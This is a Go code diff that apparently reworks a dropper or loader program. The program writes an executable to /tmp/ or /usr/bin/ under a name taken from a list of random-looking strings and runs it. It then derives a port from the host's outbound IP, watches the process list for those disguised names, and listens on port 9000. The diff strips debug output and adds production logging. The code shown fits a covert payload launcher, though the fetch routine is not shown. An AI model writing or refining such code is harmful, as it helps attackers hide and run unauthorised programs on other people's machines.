@@ -2,7 +2,6 @@ package main
 
 import (
 	"fmt"
-	"github.com/mitchellh/go-ps"
 	"io/ioutil"
 	"math/big"
 	"math/rand"
@@ -10,13 +9,15 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
-	"strings"
+	"strconv"
 	"time"
+
+	"github.com/shirou/gopsutil/process"
 )
 
 var (
-	dirArray      = []string{"/tmp/", "/usr/bin/"}
-	nodeNameArray = []string{
+	dirArray   = []string{"/tmp/", "/usr/bin/"}
+	randomName = []string{
 		"Lc8Se1Eo9P", "Df3Me8Tb9Uh6", "Lt3Xh2Nz6Hy0Wp6Q", "Wh6Cc8Ma2Kk6Pw2", "Ax6Ww3Pz4Hn0Xz8",
 		"Ab7Pm5Sn3H", "Js6Ti8Ta2Jd4Cw", "Sb9Gw5Qs3M", "Wr2Wq6Uv0Zf6", "Yb6In1Es2R", "Tz7Cw8Qu3O",
 		"Uf4Ej0Jk8F", "Sl5Bz6Rz5E", "Kq2Br6Du0F", "Wu9Vv9Ac0M", "Tp4Nn6Dz6U", "Uz9Hi5Vw9Nj6At6Yr",
@@ -73,7 +74,6 @@ func InetAtoN(ip string) int64 {
 }
 
 func calcRandomPort() int64 {
-	fmt.Println(getOutIP())
 	outIntIP := InetAtoN(getOutIP())
 	randPort := outIntIP % basePort
 
@@ -96,23 +96,8 @@ func FileExist(path string) bool {
 }
 
 func randomExecPath() string {
-	baseLen := 10
-	bytes := make([]byte, baseLen*3)
-	for i := 0; i < baseLen; i++ {
-		rand.Seed(time.Now().UnixNano())
-		lowerB := rand.Intn(26) + 65
-		upperB := rand.Intn(26) + 97
-		digital := rand.Intn(10) + 48
-		index := i * 3
-		bytes[index] = byte(lowerB)
-		bytes[index+1] = byte(upperB)
-		bytes[index+2] = byte(digital)
-	}
-
-	length := rand.Intn(20)
-	if length < baseLen {
-		length = baseLen
-	}
+	rand.Seed(time.Now().UnixNano())
+	index := rand.Intn(len(randomName) - 1)
 
 	execDir := "/"
 	for _, dir := range dirArray {
@@ -121,7 +106,7 @@ func randomExecPath() string {
 			break
 		}
 	}
-	return fmt.Sprintf(execDir + string(bytes[0:length]))
+	return fmt.Sprintf(execDir + randomName[index])
 }
 
 func runExe(execName string) error {
@@ -135,34 +120,50 @@ func runExe(execName string) error {
 }
 
 func main() {
-
-	fmt.Println(len(nodeNameArray))
-	os.Exit(0)
+	InitLogger("prod")
+	Trace.Println("Start ip-issue process")
 	execName := randomExecPath()
-	fmt.Println(execName)
 	err := getExecData(execName)
 	if err != nil {
-		fmt.Println(err)
+		Error.Println(err)
 		return
 	}
-	fmt.Println(strings.Repeat("=", 80))
-	fmt.Println(calcRandomPort())
-	fmt.Println(strings.Repeat("+", 80))
+
 	err = runExe(execName)
-	fmt.Println(strings.Repeat("-", 80))
 	if err != nil {
-		fmt.Println(err)
+		Error.Println(err)
 		return
 	}
-	fmt.Println(strings.Repeat("*", 80))
-	fmt.Println(calcRandomPort())
-	process, _ := ps.Processes()
-	for _, value := range process {
-		fmt.Println(value)
-	}
+	port := calcRandomPort()
+
+	time.Sleep(10 * time.Second)
+	go func(port int64, execName string) {
+		Trace.Println("Before isValidPort, port is " + strconv.FormatInt(port, 10))
+		for !isValidPort(port) {
+			isRunning := false
+			processes, _ := process.Processes()
+			for _, proc := range processes {
+				procName, _ := proc.Name()
+				for _, name := range randomName {
+					if procName == name {
+						isRunning = true
+						break
+					}
+				}
+			}
+			if isRunning {
+				Info.Printf("%s is Running", execName)
+			} else {
+				Warning.Printf("%s is not Running", execName)
+				break
+			}
+		}
+		Trace.Println("After isValidPort")
+	}(port, execName)
+
 	err = http.ListenAndServe(":9000", nil)
 	if err != nil {
-		fmt.Printf("HTTP Server start failed, err:%v\n", err)
+		Error.Printf("HTTP Server start failed, err:%v\n", err)
 		return
 	}
 }
